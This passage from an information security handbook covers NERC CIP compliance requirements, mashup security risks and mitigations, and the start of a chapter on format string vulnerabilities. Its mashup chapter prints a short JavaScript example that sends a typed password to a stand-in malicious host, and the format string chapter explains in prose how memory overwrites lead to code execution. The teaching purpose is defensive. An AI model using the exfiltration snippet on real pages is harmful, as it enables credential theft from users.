desired, this policy can be included in the NERC security policy detailed in CIP-003.
Implementation guidelines for this work can be reviewed in Section 11 (Access 
Control) of the Code of Practice for Information Security Management (ISO 
17799/27002), NIST Special Publications 800:53A, 800:39, and DS-5: Ensure 
Systems Security.
14.7.6  Security Status Monitoring
Monitoring in this area of the NERC standards is related to the monitoring of 
systems versus the network. This is referred to as security event monitoring. This 
monitoring is typically performed in the server and workstation environments. 
Event logs can be sent to an aggregated log server for easier review and mainte-
nance. Dependent upon the operating system, this can be done with or without 
an additional software package for log forwarding. This work can be performed 
in-house or outsourced. The organization must document the approach, implement 
automated alerting where possible (manual where not possible), and ensure that 
logs generated are securely stored for 90 days, with the exception of logs document-
ing reportable incidents, which must be securely stored for three years.
Implementation guidelines for this work can be reviewed in Section 10.10 
(Monitoring) of the Code of Practice for Information Security Management (ISO 
17799/27002), NIST Special Publications 800:53A, 800:39, and DS-5: Ensure 
Systems Security (CobiT).

182  ◾  Information Security Management Handbook
14.7.7  Disposal or Redeployment
Requirements in this area of the NERC standards mandate that NERC assets set 
for either disposal or redeployment undergo the permanent removal of NERC 
information from the system. The processes must be formally documented. In addi-
tion, records of removal must be maintained for these systems.
Implementation guidelines for this work can be reviewed in Section 9.2.6 
(Secure Disposal or Re-use of Equipment) of the Code of Practice for Information 
Security Management (ISO 17799/27002), NIST Special Publications 800:53A, 
800:39, and DS-12: Manage the Physical Environment (CobiT).
14.7.8  Cyber Vulnerability Assessment
This requirement is in direct alignment with the cyber vulnerability assessment listed 
in CIP-005. Requirements and implementation specifics are listed in that section.
14.7.9  Documentation Review and Maintenance
Documentation must also be maintained for this effort, as has been stated previ-
ously. Documentation for this effort should include
Current configuration and processes for conducting the work for CIP-007, to 
◾
◾
be formally reviewed at least annually
Should revisions to the systems occur, a modified document is required 
◾
◾
within 90 calendar days of the update
Access logs shall be kept for a minimum of 90 days, with the exception of 
◾
◾
reportable incident logs, which are kept for three years in a secured location 
(see CIP-008)
Implementation guidelines for this work can be reviewed in Section 9 (Physical 
and Environmental Security) and Section 10 (Communications and Operations 
Management) of the Code of Practice for Information Security Management 
(ISO 17799/27002), NIST Special Publications 800:53A, 800:39, DS-4: Ensure 
Continuous Service, DS-5: Ensure Systems Security, and DS-9: Manage the 
Configuration (CobiT).
14.8  Incident Reporting and Response 
Planning (CIP-008)
As stated in the NERC standards, “Standard CIP-008 ensures the identification, 
classification, response, and reporting of cyber security incidents related to critical 
cyber assets.”

NERC Compliance  ◾  183
To facilitate appropriate incident response and reporting, NERC requires the 
following to be completed by the affected organizations (“responsible entities”), as 
directly stated in the NERC standards:
Cyber security incident response plan (R1): The responsible entity shall 
◾
◾
develop and maintain a cyber security incident response plan.
Cyber security incident documentation (R2): The responsible entity shall 
◾
◾
keep relevant documentation related to cyber security incidents reportable 
for three calendar years.
14.8.1  Cyber Security Incident Response Plan
The incident response plan must include, at minimum:
Procedures to help to differentiate among NERC events, incidents, and 
◾
◾
reportable security incidents
Identification of the NERC Incident Response Team, along with documenta-
◾
◾
tion of the members’ responsibilities
Formal documentation of NERC incident handling procedures and com-
◾
◾
munication plans
A formal and documented process for reporting all security incidents 
◾
◾
directly (or through an intermediary) to the Electricity Sector Information 
Sharing and Analysis Center (ES ISAC). The responsible entity must ensure 
that all
Formal and documented process for updating the incident response plan 
−
−
within 90 calendar days of any changes
Formal and documented process for an (at least) annual review of the 
−
−
incident response plan
Formal and documented process for (at least) annual testing of the incident 
−−
response plan is required, to include at least a desktop drill, a full simula-
tion exercise, and, if possible, the response to an actual security incident
Implementation guidelines for this work can be reviewed in Section 13 
(Information Security Incident Management) of the Code of Practice for Information 
Security Management (ISO 17799/27002), Section 8 (Resolution Processes) of the 
Code of Practice for Information Technology Service Management (ISO 20000-2), 
NIST Special Publications 800:53A, 800:39, DS-5: Ensure Systems Security, DS-8: 
Manage the Service Desk and Incidents, and DS-10: Manage Problems (CobiT).
14.8.2  Cyber Security Incident Documentation
This requirement is related to previously stated requirements for the formal documen-
tation and secure retention of security incident reports for a period of three years.

184  ◾  Information Security Management Handbook
Implementation guidelines for this work can be reviewed in Section 13 
(Information Security Incident Management) of the Code of Practice for 
Information Security Management (ISO 17799/27002), Section 8 (Resolution 
Processes) of the Code of Practice for Information Technology Service 
Management (ISO 20000-2), NIST Special Publications 800:53A, 800:39, 
DS-5: Ensure Systems Security, DS-8: Manage the Service Desk and Incidents, 
and DS-10: Manage Problems (CobiT).
14.9  Recovery Plans for Critical Assets (CIP-009)
As stated in the NERC standards, “Standard CIP-009 ensures that recovery plan(s) 
are put in place for critical cyber assets and that these plans follow established busi-
ness continuity and disaster recovery techniques and practices.”
To facilitate appropriate incident response and reporting, NERC requires the 
following to be completed by the affected organizations (“responsible entities”), as 
directly stated in the NERC standards:
Recovery plans (R1): The responsible entity shall create and annually review 
◾
◾
recovery plan(s) for critical cyber assets.
Exercises (R2): The recovery plans shall be exercised at least annually. An 
◾
◾
exercise of the recovery plans can range from a paper drill, to a full opera-
tional exercise, to recovery from an actual incident.
Change control (R3): Recovery plans shall be updated to reflect any changes 
◾
◾
or lessons learned as a result of an exercise or the recovery from an actual 
incident. Updates shall be communicated to personnel responsible for the 
activation and implementation of the recovery plans within 90 calendar days 
of the change.
Backup and restore (R4): The recovery plans shall include processes and pro-
◾
◾
cedures for the backup and storage of information required to restore critical 
cyber assets successfully. For example, backups may include spare electronic 
components or equipment, written documentation of configuration settings, 
tape backup, etc.
Testing backup media (R5): Information essential to recovery that is stored 
◾
◾
on backup media shall be tested at least annually to ensure that the informa-
tion is available. Testing can be completed off site.
14.9.1  Recovery Plans
A recovery plan (i.e., business continuity plan) is required for all NERC assets. This 
plan must be reviewed at least annually, and must include specific actions for disas-
ters, based both on severity and duration of the disaster, as well as responsibilities 
for those personnel affected by the plan.

NERC Compliance  ◾  185
Implementation guidelines for this work can be reviewed in Section 14 
(Business Continuity Practices) of the Code of Practice for Information Security 
Management (ISO 17799/27002), The Code of Practice for Business Continuity 
Management (BS 25999-1), NIST Special Publications 800:53A, 800:39, DS-4: 
Ensure Continuous Service, DS-10: Manage Problems, and DS-11: Manage 
Data (CobiT).
14.9.2  Exercises
A formal and documented process for (at least) annual testing of the recovery plan 
is required, to include at least a desktop drill, a full simulation exercise, and, if pos-
sible, the documented response to an actual disaster.
Implementation guidelines for this work can be reviewed in Section 14 (Business 
Continuity Practices) of the Code of Practice for Information Security Management 
(ISO 17799/27002), The Code of Practice for Business Continuity Management (BS 
25999-1), NIST Special Publications 800:53A, 800:39, DS-4: Ensure Continuous 
Service, DS-10: Manage Problems, and DS-11: Manage Data (CobiT).
14.9.3  Change Control
Any lessons learned as a result of a recovery should be incorporated into the 
recovery plan. This information should be added to the recovery plan in such 
a way that information that is still viable is preserved. Changes must be com-
municated to staff, either through formal training or by computer-based means, 
within 90 days.
Implementation guidelines for this work can be reviewed in Section 14 (Business 
Continuity Practices) of the Code of Practice for Information Security Management 
(ISO 17799/27002), The Code of Practice for Business Continuity Management (BS 
25999-1), NIST Special Publications 800:53A, 800:39, DS-4: Ensure Continuous 
Service, DS-10: Manage Problems, and DS-11: Manage Data (CobiT).
14.9.4  Backup and Restore
Processes and procedures for backups and restores must be formally documented. 
It is also advisable to test these procedures to ensure that they correctly capture 
these critical functions. Any documentation contributing to this work could also 
be included in this requirement.
Implementation guidelines for this work can be reviewed in Section 14 (Business 
Continuity Practices) of the Code of Practice for Information Security Management 
(ISO 17799/27002), The Code of Practice for Business Continuity Management (BS 
25999-1), NIST Special Publications 800:53A, 800:39, DS-4: Ensure Continuous 
Service, DS-10: Manage Problems, and DS-11: Manage Data (CobiT).

186  ◾  Information Security Management Handbook
14.9.5  Testing Backup Media
Testing of backup media is essential to ensure that the media is viable and restores 
can be appropriately completed in a timely fashion. Backup media must be tested 
at least annually.
Implementation guidelines for this work can be reviewed in Section 14 (Business 
Continuity Practices) of the Code of Practice for Information Security Management 
(ISO 17799/27002), The Code of Practice for Business Continuity Management (BS 
25999-1), NIST Special Publications 800:53A, 800:39, DS-4: Ensure Continuous 
Service, DS-10: Manage Problems, and DS-11: Manage Data (CobiT).
14.10  Conclusion
The security, infrastructure, and compliance requirements set forth in the 
NERC standards can present challenges for the organization required to comply. 
Fortunately for the practitioner, there are many resources, vetted by the interna-
tional community, to assist with implementation. A considered selection of controls 
can also make the job much easier for both the practitioner and the organization. 
Regardless of the control implementation chosen, the organization should allow 
sufficient time, resources, and dollars for a robust compliance effort.
Bibliography
BS 25999, Part 1: Code of Practice for Business Continuity Management, 2006.
ISO/IEC 17799, International Standard: Code of Practice for Information Security, 2005.
ISO/IEC 20000, Part 2: Code of Practice for Information Technology, 2005.
NERC Cyber Security Standards, North American Electric Reliability Corporation, 2007.

4
Application 
Security


189
15
Chapter 
Mashup Security
Mano Paul
15.1  Introduction
Among the various new technologies like Green IT and business process model-
ing and virtualization, Gartner Research ranked mashups and composite applica-
tions sixth in the top ten technologies for 2008. In today’s enterprise, mashups 
are undoubtedly an up-and-coming technological trend. The first known mashup 
began with the application programming interface (API) provided by Google for 
Google Maps and then Google Earth. Microsoft later introduced Virtual Earth 
API, which provides similar ability.
Contents
15.1	 Introduction..............................................................................................189
15.2	 What Are Mashups?..................................................................................190
15.3	 Types of Mashups......................................................................................190
15.4	 Mashup Architecture................................................................................190
15.5	 Mashup Editors.........................................................................................191
15.6	 Difference between a Mashup and a Portal...............................................191
15.7	 Mashup Security.......................................................................................192
15.8	 Impact on Confidentiality, Integrity, and Availability...............................194
15.8.1	Confidentiality Impact..................................................................195
15.8.2	Integrity Impact.............................................................................195
15.8.3	Availability Impact........................................................................196
15.9	 Control/Mitigation Measures....................................................................196
15.10 Conclusion...............................................................................................198

190  ◾  Information Security Management Handbook
15.2  What Are Mashups?
The OpenAjax Alliance definition of a mashup is a Website or application that 
combines content from more than one source into an integrated experience. In 
other words, applications that aggregate data from multiple sources are called a 
mashup. A mashup brings together data from various sources that are not generally 
accessible. Web feeds (RSS and Atom), public interfaces (Web services), internal 
API, and even screen scraping are common sources of mashup content.
For all practical purposes, mashups are “mini-applications” that enable cross-
site communications by providing proxy services. Mashups play a major role in 
the business environment today. They create new services for consumers, which 
affords the consumer the possibility to create a lot of new possibilities. They are 
used today in rich-media advertisements. Mashups can be used for creating travel 
portals, organizing pictures (as in the case of Flickr), news aggregation, law enforce-
ment (as in the case of the Chicago Police Department), and can be used for other 
specialized needs like highlighting customer locations in a sales force application or 
pinpointing shipment information in a logistic application.
15.3  Types of Mashups
Mainly, there are two types of mashups: consumer mashups and enterprise mash-
ups. Consumer mashups are otherwise known as end-user mashups and are con-
trolled by the end user. They are used for providing an increased user experience. 
Enterprise mashups, on the other hand, are back-end driven, where systems, instead 
of users, control the integration of data or content from various disparate sources 
(internal and external) to provide organizations with business context information, 
aiding in decision making such as trending of sales, shipping, and logistic perfor-
mance, to name a few.
A classic and canonical example of a mashup is generating digital maps using 
cartographic data with geographic (address) information. An example of a con-
sumer mashup is Google Maps, which replaced the dull, noninteractive textual 
direction information with visual maps that are not only interactive, but also cus-
tomizable. Other good examples of social networking consumer mashups are wid-
gets of Facebook and MySpace. An example of an enterprise mashup is generation 
of a daily sales and shipment report, by combining data from the internal sales 
systems and the external shipping outsourcer periodically into a human-readable 
decision-making report.
15.4  Mashup Architecture
Figure 15.1 illustrates a common mashup architecture. It is comprised primarily of

Mashup Security  ◾  191
Clients (end-user browsers)
◾
◾
Site (the Website or application)
◾
◾
Sources (content providers)
◾
◾
15.5  Mashup Editors
Mashups aided with powerful editors can be said to be do-it-yourself software that 
brings the power of the desktop to the Web and are generally characterized as being 
very intuitive, increasing the user experience. Mashup editors are WYSIWYG (what 
you see is what you get) for mashups that provide a visual interface with drag-and-
drop features to build mashups. There are many mashup editors, the most popular 
of which are Microsoft® Popfly™, Google Mashup Editor, Yahoo! Pipes™, and IBM® 
Zero Assemble. Figure 15.2 illustrates the Microsoft mashup editor Popfly aggre-
gating images in Flickr with Microsoft Virtual Earth™.
Mashup editors are extremely useful in abstracting a lot of technical coding to 
aggregate content from various sites, affording even a nontechnical user the possi-
bility to create efficient mini-applications. The level of abstraction, however, comes 
with serious security implications. The creator of the mashup has little knowledge 
of security configuration in the back end unless the mashup components have APIs 
exposed for the user explicitly to configure security.
15.6  Difference between a Mashup and a Portal
Although mashups and portals are both content-aggregation technologies, they are 
distinctly different. Portals are an older technology, quite prevalent in Microsoft 
SharePoint technologies in the traditional Web server model; mashups are a more recent 
External
Internal
Web
Services
ATOM
RSS
CLIENTS
SITE
SOURCES
Figure 15.1  A common mashup architecture.

192  ◾  Information Security Management Handbook
Web technology. Content aggregation is primarily on the server end in portals; in the 
case of mashups, they can take part on both the client and server end. Additionally, 
with portals being an older technology, they are more mature and standardized.
15.7  Mashup Security
Benefits of mashups include but are not limited to reusable and personalized appli-
cations at decreased costs and heightened user experience. But these benefits come 
with some risks as well. Limited standardization and more flexibility given to the 
end user (even nontechnical) in mashup technology are two among many others 
that make it important to give consideration to security when planning to imple-
ment mashups in your organization.
Starting out as simple tools for consumers to use, such as housing information 
on Craigslist being placed on Google Maps, mashups have become complex and 
popular in the enterprise today. Not only is mere textual data being integrated from 
various sources, but code as well. So now we have a new problem. Source code that 
is not your own needs to be trusted and secure. Research indicates that preserving 
the creative freedom that mashups offer and making them secure at the same time 
is undoubtedly a challenge, to say the least.
Mashups is one of the two new Web application development approaches, quite 
noticeable under the Web 2.0 umbrella. The other is Asynchronous JavaScript + 
XML (Ajax). XMLHttpRequest is the underlying Ajax technology that drives mash-
ups. It is an API that allows client-side scripts to make connections to remote Web 
Figure 15.2  Microsoft® Popfly™ mashup editor.

Mashup Security  ◾  193
servers allowing for data interchange in various formats. These formats can be plain-
text, XML, or JavaScript Serialized Object Notation (JSON). JSON is part of the 
JavaScript scripting language because it is a subset of the ECMAScript language, but 
it is language independent and defines sets of formatting rules to represent data.
Mashups are dynamic and multi-domain by nature and this introduces new 
threats to the already-existing insecure landscape.
The following characteristics of mashups make the already-complex security 
ecosystem as we know it today even more complex:
Aggregation of content or code from various sources. These sources may be 
◾
◾
internal or external, trusted or untrusted.
Perimeter defenses (firewalls) do little to protect against integration of con-
◾
◾
tent or code from disparate sources outside their boundary.
End users in consumer mashups are given the ability to create an experience 
◾
◾
as it suits their needs, using just a Web browser, requiring that security con-
siderations are now of critical importance on the client side as well.
Back-end systems in enterprise mashups are given the ability to mash data 
◾
◾
and content from various sources with limited human oversight, thereby 
potentially making malicious activity go unnoticed.
Additionally, with the introduction of mashups, security is not just the sole 
responsibility of the telecommunications and network personnel (and it has never 
just been), but also that of the application development teams and enterprise archi-
tects. Not only should the enterprise perimeter be protected, but application logic, 
interfaces, connectivity, design, development, and user actions should be consid-
ered and monitored. Security can no longer be an afterthought and needs to be 
built-in from the very beginning.
Access controls in today’s browsers are governed by what is known as the same-
origin policy (SOP), which provides total isolation by preventing code and scripts 
loaded from one origin to access document properties from another. The SOP is 
an all-or-nothing security model. But SOP applies only to HTML documents and 
Resources files.
Browsers enforce the SOP by literal string comparison. For example, http://
www.studiscope.com (the official (ISC)2 CISSP® self-assessment site) and 
http://38.113.185.127 are both treated as different domains even though the IP 
address 38.113.185.127 belongs to the www.studiscope.com domain. Literal string 
comparison based checking for trust is weak. Just because the browser can validate 
that the resources are from the same origin does not mean that the content is. With 
content being integrated from various sources (internal and external) in mashups, 
the content itself may include malicious threats that the SOP can do little about.
SOP provides total isolation; mashups require total trust. The SOP will restrict 
mashups from accessing code and scripts from sites that are not in the same origin 
as its own.

194  ◾  Information Security Management Handbook
To circumvent this restriction by the SOP, a mashup author can use any one of 
the following:
The 
◾
◾
src attribute of the <script> tag with JSON as the output: The SOP does 
not apply to the src attribute of the <script> tag. When using the src attribute 
of the <script> tag, third-party code and scripts are treated as if originating 
from the document’s origin and can access all of the resources of the docu-
ment that references it, meaning third-party code and scripts will have total 
trust. When JSON includes a call to a callback function and is designated 
as the output along with the src attribute of the <script> tag as shown in 
Figure 15.3, it is known as JSON Padding (JSONP).
Browser extensions and plug-ins: Browser extensions and plug-ins can be 
◾
◾
installed in almost every popular browser like Microsoft Internet Explorer 
or Mozilla Firefox. When extensions and plug-ins are installed, they are now 
also a target increasing the attack surface area. Weaknesses in these exten-
sions and plug-ins can be exploited as well. In most cases, the only protec-
tion mechanism that these extensions and plug-ins provide is user sanction 
prior to their installation. However, browser extensions and plug-ins are not 
restricted by the SOP, allowing for data and content integration from third-
party sites on your own.
Ajax proxy: Http requests and responses can be mediated between the cli-
◾
◾
ent browsers and the Web server, using an Ajax proxy that bypasses SOP to 
access remote third-party content and code using the XMLHttpRequest API. 
One way to achieve this is, if the remote site URL is known, the Web appli-
cation client browser can pass the URL as a request parameter to the Ajax 
Proxy, which in turn forwards the request to the remote third-party site. If 
the remote site URL is unknown to the Web application client, then the Ajax 
proxy can be preset with information to translate a URL request to the Ajax 
proxy into the respective remote site URL.
15.8  Impact on Confidentiality, 
Integrity, and Availability
When your organization’s site has to aggregate code from third-party sites, the SOP 
offers no protection at all. The Catch-22 is either you have to trust the third party 
<script type=”text/javascript” src=”http://www.studiscope.
com/certify?certName=CISSP&organization=isc2&output=json&cal
lback=showAssessments” />
Figure 15.3  JSON Padding showing output as JSON with a callback function.

Mashup Security  ◾  195
or accept the risk on your site, relaxing protection mechanisms. Malicious threats 
can find their way into mashups leading to compromise of confidentiality (data 
disclosure), integrity, and availability.
15.8.1  Confidentiality Impact
Malicious scripts injected into mashup content using client-side attack techniques 
like cross-site scripting, can lead to disclosure of sensitive information. A common 
method of script injection is to embed the script as an attribute of a seemingly 
innocuous object, like an image, and hide the image with its height and width 
parameters smaller (like 1 pixel wide, 1 pixel high) than what the human eye can 
perceive. When the content from the injected site is integrated, then the containing 
site is now vulnerable as well, and the script may execute on the end user’s client 
browser, causing a compromise. Such script attacks can be used to steal authenti-
cation information (passwords) and cookies or be used as keyloggers. Figure 15.4 
demonstrates a script that can be used to steal a password.
Web-application cookie theft is equally serious as is theft of authentication 
information and passwords. Stolen cookies can be used for hijacking sessions or in 
replay attacks at a later time.
Client-side script attacks can also be used to steal keys pressed or even detect X 
and Y mouse coordinates, should a virtual on-screen keyboard be used as a protec-
tive measure against keylogging.
Because the underlying mashup technologies do not require explicit user actions 
(such as clicking on a link or button), nefarious activities like theft of confidential 
and private information may for the most part go unnoticed.
15.8.2  Integrity Impact
Using a technique called cross-site request forgery (CSRF) in which malicious cli-
ent script code with hijacked session tokens make arbitrary requests to Web servers, 
invoking actions as if they were initiated from an authorized user, can have serious 
impact on integrity. Integrity violations can include unauthorized modification of 
user content, such as configurations on networking devices, posting on social blog 
sites, etc.
function getPassword()
{
  var _oPwd = document.getElementById(“userPwd”).value;
  document.images[0].src=”http://www.malicioussite.com/images/
  retrievePwd?password=” + _oPwd;
}
Figure 15.4  Password-stealing script.

196  ◾  Information Security Management Handbook
An attacker can also make unauthorized modifications to any Document 
Object Model hierarchy, client-side themes and style sheets. Such modifications 
can be used to mask and overwrite warning and error messages with information 
controlled by the attacker.
15.8.3  Availability Impact
Saturating a client system with repeated requests so that legitimate traffic cannot 
be responded to will cause a denial of service (DoS). When third-party JavaScript 
is interpreted repeatedly in a loop infinitely within the client browser, it can lead 
to an availability compromise, and thus a denial of service. An attacker can inject 
a DoS script into a site that is aggregated into the mashup site, and both these sites 
then become vulnerable to availability threats.
15.9  Control/Mitigation Measures
Most of the security control and mitigation measures for Ajax applications also 
apply for mashups. The following mechanisms are recommended control measures 
that can be used to mitigate mashup security threats:
Use input validation: Input validation is the best form of defense against the 
◾
◾
majority of security threats including mashup security. Content needs to be 
filtered or validated when aggregating from different sites into your mashup 
application. Two well-known methods of input validation are blacklisting 
and whitelisting. In blacklisting, any characters in the list are filtered and 
not allowed. In whitelisting, only the characters in the list are allowed. One 
of the most frequently asked questions about input validation is the type of 
approach one should use—blacklist or whitelist—when implementing input 
validation in applications. There is no clear-cut answer to this question, and a 
layered hybrid approach improves security the most. It is also recommended 
that a centralized input validation framework is developed so that it can be 
used everywhere in all mashup aggregations. Another benefit of having a 
centralized input validation framework is ease of maintaining the blacklist 
and whitelist in one place.
Disallow dynamic execution of code: JavaScript has the 
◾
◾
eval() function that 
allows for execution of strings as code, and without proper precautions, this 
could be disastrous. As a general security best practice, disallow any dynamic 
execution of code.
Use innerText instead of innerHTML: Malicious code can be inserted in 
◾
◾
mashup content using the innerHTML property of elements on the Web 
page and this could lead to serious compromises. The browser would read and 
render HTML on the client system, and any masqueraded exploit would be 

Mashup Security  ◾  197
executed. Using the innerText property makes the browser read the Website 
elements as plaintext and malicious code (script and HTML) is disarmed.
Use security tokens: Passing a security token (can be a string) in the URL or as 
◾
◾
a hidden field value to identify the source of the HTTP requests uniquely is a 
recommended mashup security measure. Hidden field value passing is a little 
more secure than passing it in the URL where it is openly visible. The impor-
tant thing is that the security token should not be guessable or predictable.
Use HttpOnly cookie: This option (supported in most popular browsers) is a 
◾
◾
security countermeasure that prevents client-side scripts from accessing docu-
ment cookies, but this has been proven to be circumvented and should be 
used only in conjunction with other security countermeasures.
Use constraining languages: Use of a constraining language is a security 
◾
◾
mechanism that can be taken for securing mashups, but this is very spe-
cific to either an application or company. The best known examples of con-
straining languages are Facebook Markup Language (FBML) and Facebook 
JavaScript (FBJS). FBML is an evolved subset of HTML with some elements 
removed, and others, which are specific to Facebook, added to enable you 
to build full Facebook platform applications that deeply integrate in a user’s 
Facebook experience. FBJS is Facebook’s solution for developers who want 
to use JavaScript in their Facebook applications. FBJS empowers developers 
with all the functionality they need, along with protecting users’ privacy at 
the same time.
Use DOM semantics: DOM semantics is another countermeasure against 
◾
◾
mashup security threats. The best-known examples of DOM semantics 
are ADsafe and Caja. ADsafe makes it safe to put guest code (such as 
third-party scripted advertising or widgets) on any Web page. Caja is 
Google’s source-to-source translator for securing JavaScript-based Web 
content, which enables Web applications safely to allow scripts in third-
party content.
Use IFrames <iframe> for componentization: For security reasons, third-
◾
◾
party components should be confined so they will not interfere with other 
components, and the <iframe> structure can help provide this confinement. 
With lack of standardization, sandboxing third-party code on one’s site is yet 
to become an accepted protocol.
Use secure components: Recently, IBM released a security tool name sMash 
◾
◾
(for secure mashup) that aims at providing security between mashup com-
ponents, independent of the browser. sMash’s secure component model 
involves encapsulating content from different trust domains as components, 
loaded and unloaded dynamically in a browser. Communication channels 
are abstracted and connect these components that are loaded from their own 
server (as opposed to being proxied or using a <script> element) and isolated 
from the mashup application code. It is implemented as a JavaScript library 
that is available as open source in the OpenAjax Alliance sourceforge project 

198  ◾  Information Security Management Handbook
today. Such an implementation has the benefits of not requiring the compo-
nent to trust the mashup application completely and has been tested with 
most popular browsers today. The biggest advantage of the sMash security 
model for mashups is that it does not interfere with nor make any changes to 
the browser.
15.10  Conclusion
Mashups are an up-and-coming trend that allows consumers (users) and enterprises 
to integrate content and code from other sites, including third-party sites. This kind 
of integration requires that security in these aggregated situations (mashups) is not 
an afterthought, but needs to be built-in from the very beginning. A browser-based 
same-origin policy can restrict scripts and code from other sites to be accessed, but 
this needs to be circumvented in mashups. Content that is aggregated from vari-
ous sources can contain vulnerabilities that can make the mashup site susceptible 
to confidentiality, integrity, and availability threats and these threats need to be 
addressed or mitigated without fail.

199
16
Chapter 
Format String 
Vulnerabilities
Mano Paul
16.1  Introduction
Format string vulnerabilities were first discovered in the early 1990s when C shell 
(csh) was being fuzz tested for defects. But it was not until 2000, when a publica-
tion on a format string exploit of the Washington University File Transfer Protocol 
daemon (WU-FTPD) was made, that the Bugtraq mailing list exposed what was 
primarily restricted to certain “hacking” groups.
Although initially deemed to be innocuous, this newly discovered class of vul-
nerability, called “format string vulnerability,” soon proved to be extremely potent, 
Contents
16.1	 Introduction..............................................................................................199
16.2	 Format String Vulnerabilities................................................................... 200
16.3	 Impact on Confidentiality, Integrity, and Availability...............................202
16.3.1	Confidentiality Impact..................................................................202
16.3.2	Integrity Impact.............................................................................203
16.3.3	Availability Impact........................................................................203
16.4	 Control/Mitigation Measures....................................................................203
16.5	 Management Controls.............................................................................. 204
16.6	 Technical Controls................................................................................... 204
16.7	 Format String Vulnerability and Buffer Overflow.....................................205
16.8	 Conclusion............................................................................................... 206

200  ◾  Information Security Management Handbook
with successful exploitation leading to serious consequences, including information 
leakage, execution of arbitrary code, or crashing programs.
In 2004, the famous Unreal game engine made by Epic Games software (www.
epicgames.com) was found susceptible to format string attacks in which gamers 
could crash the servers by inserting a “%n” character into ingress packets. That 
same year, the Windows® FTP server was found vulnerable to format string vulnera-
bilities, with a more serious impact because the server just did not crash but allowed 
a user to execute arbitrary code remotely when %n and %s characters were input.
Today, with the advent and evolution of programming languages, format string 
vulnerabilities are not as prevalent as they used to be. Nevertheless, it is critical 
to know and understand what a format string vulnerability is and how it can be 
exploited because the impact of successful exploitation can be catastrophic.
16.2  Format String Vulnerabilities
To understand format string vulnerabilities, one must first understand what a format 
string is. Format string vulnerability is not specific to operating system (OS) and 
affects any OS that has a C compiler (which is pretty much every OS known today).
Some functions in the C/C++ printf family of functions do not have a fixed 
number of arguments. Determining the number of variable arguments (va_args) is 
usually done by passing the number as one of the arguments. But this is optional 
because the ANSI C standard has a mechanism to access the arguments, passed 
on to the stack, irrespective of the number of arguments actually passed. In case of 
the printf family of functions, the number of variable arguments can be calculated 
by the format string passed to it. The printf function creates and outputs strings at 
runtime. These functions allow programmers to create a string based on the format 
specified along with the variable list of arguments.
Table 16.1 lists the most common printf family of functions and their descrip-
tions in the standard C library. Although, the printf family of functions is primarily 
Table 16.1  printf Family of Functions
Function
Description
printf
Print formatted data to standard output (stdout)
fprintf
Write formatted output to stream
sprintf
Write formatted data to string
vfprintf
Write formatted variable argument list to stream
vprintf
Print formatted variable argument list to standard output (stdout)
vsprintf
Print formatted variable argument list to string

Format String Vulnerabilities  ◾  201
implemented in the C/C++ programming languages, they can also be implemented 
in other languages, such as Perl.
Format string vulnerability is best demonstrated by the following example. The 
first concept of programming that one probably learns when introduced to the C 
programming language is the well-known “Hello World” program that outputs 
to the console the string “Hello World” using the C printf function as shown in 
Figure 16.1. One graduates from there to learning variations of the printf func-
tion, handling user input arguments and displaying (printing) them as output. 
Figure 16.2 illustrates a simple program that takes in user-supplied arguments and 
outputs the first argument as a string.
The first part of the printf statement, denoted as “%s,” is a format string and the 
second part, denoted by argv[1], is the argument list referencing the first argument 
in the array list of variables supplied by the user. The format string, also known 
as the “format token” or “format specifier,” is what tells the function the format 
in which to output the argument (in this case, a string). Table 16.2 lists common 
format tokens used in everyday programming.
This function is dependent on the user to supply the variable corresponding 
to the format token as its second argument. In the Intel® architecture, arguments 
are pushed on to the stack (a data structure in memory, that uses a last in, first 
out [LIFO] mechanism for data access) prior to its creation, and when functions 
reference their arguments on this platform, they reference the data that is on the 
stack. If a variable corresponding to the format token is not supplied by the user, 
the program does not fail to compile; however, there is no valid address for the 
omitted variable on the stack, and at runtime, the function will read and output 
whatever data occupies the memory address at the top of the stack. This is the crux 
of what makes a format string attack possible. Additionally, not only is it possible 
to read data from protected memory space or an invalid address on the stack, but 
it is possible to write data on the stack as well. Because one can read and write data 
on the stack, this class of format string vulnerabilities should be deemed extremely 
Figure 16.1  Hello World program using printf function.
Figure 16.2  User supplied argument output using printf function.

202  ◾  Information Security Management Handbook
dangerous. An attacker can specify any pointer, using the %n format token, control 
memory addresses of choice, and cause instructions at that pointer to be executed, 
which could be malicious shell code. If the pointer specified is valid, then arbitrary 
code where the pointer points to can be executed; if it is not valid, the program will 
crash, causing a denial of service.
16.3  Impact on Confidentiality, 
Integrity, and Availability
Exploiting format string vulnerabilities by specifying format tokens without their 
corresponding variables can lead to any or all of the following: information leakage 
(disclosure), overwriting data on stack and memory addresses (alteration), or crash-
ing programs and services (destruction).
16.3.1  Confidentiality Impact
When a program is run, execution instructions, dynamic variables, and some 
global variables are stored on the heap (a data structure in memory that uses a 
first in, first out [FIFO] mechanism for instructions or data access). Function 
calls, local variables, and information that need not be persisted are stored on 
the stack. If the program has any sensitive information (such as cryptographic 
keys, license keys, passwords, and other data that would be deemed intellectual 
property), these would be loaded onto the stack. If the program is susceptible 
Table 16.2  Common Format Tokens
Token
Output
%s 
String format
%i
Signed integer string
%d
Signed decimal string
%f
Signed decimal string of the form (xx:yy)
%u
Unsigned decimal string
%x
Unsigned hexadecimal string
%c
Character format
%p
Formats a pointer to as address
%n
Number of bytes written so far (nothing is visible)
%%
Just inserts %

Format String Vulnerabilities  ◾  203
to format string vulnerabilities, this information can be read (leaked) when an 
attacker exploits the vulnerability. Even code from dynamically linked libraries 
that is loaded on the stack can be disclosed. Stack protection mechanisms have 
been proven not to be successful in addressing format string vulnerabilities. It is 
also important to be aware that format string attacks are not exclusive to affecting 
the stack, and although it may be a little challenging, overwriting null termina-
tors with non-null data can convert a format string vulnerability on the stack to 
overflow the heap.
16.3.2  Integrity Impact
Because one can read and write to memory using format tokens without cor-
responding variables in the argument list, an attacker can overwrite a function 
pointer or return address in memory and get to run arbitrary code. An attacker 
could also overwrite global offset tables (GOT) that handle nonstatic relocations 
for functions and destructors (DTORS), which is the code run before a program 
exits. The ability to write and make unauthorized modifications in memory is what 
gives rise to serious integrity threats.
16.3.3  Availability Impact
Integrity violations by format string attacks also have a potential bearing on avail-
ability. Writing changes to memory can lead to crashing programs and segmenta-
tion violations (SEGV) when address pointers are overwritten (using the %n format 
token) to point to invalid addresses, causing a denial of service.
16.4  Control/Mitigation Measures
Format string vulnerabilities are possible for two reasons. One may assert that one 
reason for format string attacks to be possible is indolence on part of the program-
mer for not ensuring that all format tokens have corresponding variables on the 
stack. This kind of programming inefficiency can be mitigated by simple secure-
coding measures. The other reason is more fundamental and has to do with how 
the C/C++ programming languages handle arguments in the family of functions 
that output formatted strings, for which there are no real mitigation measures.
